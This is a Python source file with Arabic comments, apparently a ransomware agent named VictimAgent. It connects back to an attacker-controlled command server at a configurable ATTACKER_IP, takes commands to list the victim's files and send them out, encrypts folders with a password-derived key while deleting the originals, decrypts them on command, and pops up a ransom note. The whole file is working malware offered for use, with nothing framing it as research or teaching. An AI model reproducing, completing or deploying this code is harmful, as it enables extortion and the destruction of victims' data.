import socket
import os
import threading
import time
import json
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.exceptions import InvalidSignature
import tkinter as tk
from tkinter import messagebox


class VictimAgent:
    def __init__(self, c2_host, c2_port=9999):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.socket = None

    def send_response(self, response_type, data):
        try:
            response = {'type': response_type, 'data': data}
            self.socket.sendall((json.dumps(response) + "\n\n").encode('utf-8'))
        except Exception as e:
            print(f"[-] فشل إرسال الاستجابة: {e}")

    def connect_to_c2(self):
        while True:
            try:
                print(f"[*] محاولة الاتصال بـ {self.c2_host}:{self.c2_port}...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.c2_host, self.c2_port))
                print("[+] تم الاتصال بنجاح.")
                self.send_response('status', 'العميل متصل وجاهز لاستلام الأوامر.')
                self.listen_for_commands()
                break
            except Exception:
                print("[-] فشل الاتصال. إعادة المحاولة بعد 10 ثوانٍ...")
                time.sleep(10)

    def listen_for_commands(self):
        buffer = ""
        while True:
            try:
                data = self.socket.recv(4096).decode('utf-8')
                if not data: break
                buffer += data
                while "\n\n" in buffer:
                    message, buffer = buffer.split("\n\n", 1)
                    command = json.loads(message)
                    print(f"[!] تم استلام أمر: {command['action']}")
                    self.execute_command(command)
            except (ConnectionResetError, json.JSONDecodeError):
                break
        print("[-] انقطع الاتصال. محاولة إعادة الاتصال...")
        self.socket.close()
        self.connect_to_c2()

    def execute_command(self, command):
        action = command.get('action')
        if action == 'list_files':
            self.list_files(command.get('path'))
        elif action == 'encrypt':
            self.encrypt_path(command.get('path'), command.get('password'))
        elif action == 'decrypt':
            self.decrypt_path(command.get('path'), command.get('password'))
        elif action == 'show_note':
            self.show_note(command.get('message'))

    def list_files(self, path):
        if path == '~':
            path = os.path.expanduser("~")
        file_list = []
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                item_type = 'dir' if os.path.isdir(full_path) else 'file'
                file_list.append({'name': item, 'path': full_path, 'type': item_type})
            self.send_response('file_list', file_list)
        except Exception as e:
            self.send_response('status', f"خطأ في استعراض الملفات: {e}")

    def get_fernet(self, password, salt):
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return Fernet(key)

    def encrypt_path(self, path, password):
        self.send_response('status', f"بدء تشفير المسار: {path}")
        salt = os.urandom(16)
        fernet = self.get_fernet(password, salt)
        if os.path.isfile(path):
            self._encrypt_file(path, fernet, salt)
        elif os.path.isdir(path):
            for root, _, files in os.walk(path):
                for file in files:
                    if not file.endswith('.locked'):
                        self._encrypt_file(os.path.join(root, file), fernet, salt)
        self.send_response('status', f"اكتمل تشفير المسار: {path}")

    def _encrypt_file(self, file_path, fernet, salt):
        try:
            with open(file_path, 'rb') as f:
                original_data = f.read()
            encrypted_data = fernet.encrypt(original_data)
            with open(file_path + '.locked', 'wb') as f:
                f.write(salt)
                f.write(encrypted_data)
            os.remove(file_path)
            self.send_response('status', f"  - تم تشفير: {os.path.basename(file_path)}")
        except Exception as e:
            self.send_response('status', f"  - خطأ في تشفير {os.path.basename(file_path)}: {e}")

    def decrypt_path(self, path, password):
        self.send_response('status', f"بدء فك تشفير المسار: {path}")
        if os.path.isfile(path) and path.endswith('.locked'):
            self._decrypt_file(path, password)
        elif os.path.isdir(path):
            for root, _, files in os.walk(path):
                for file in files:
                    if file.endswith('.locked'):
                        self._decrypt_file(os.path.join(root, file), password)
        self.send_response('status', f"اكتمل فك تشفير المسار: {path}")

    def _decrypt_file(self, file_path, password):
        try:
            with open(file_path, 'rb') as f:
                salt = f.read(16)
                encrypted_data = f.read()
            fernet = self.get_fernet(password, salt)
            decrypted_data = fernet.decrypt(encrypted_data)
            original_path = file_path.replace('.locked', '')
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            os.remove(file_path)
            self.send_response('status', f"  - تم فك تشفير: {os.path.basename(original_path)}")
        except InvalidSignature:
            self.send_response('status', f"  - خطأ: كلمة المرور غير صحيحة أو الملف تالف لـ {os.path.basename(file_path)}")
        except Exception as e:
            self.send_response('status', f"  - خطأ في فك تشفير {os.path.basename(file_path)}: {e}")

    def show_note(self, message):
        def display():
            root = tk.Tk()
            root.withdraw()
            messagebox.showwarning("!!! تحذير أمني !!!", message)
            root.destroy()
        threading.Thread(target=display).start()
        self.send_response('status', "تم عرض رسالة الفدية للضحية.")


if __name__ == "__main__":
    # !!! هام: قم بتغيير هذا العنوان إلى عنوان IP الخاص بجهاز المهاجم !!!
    ATTACKER_IP = "192.168.1.100"  # <--- غير هذا العنوان إلى IP جهازك
    agent = VictimAgent(c2_host=ATTACKER_IP)
    agent.connect_to_c2()
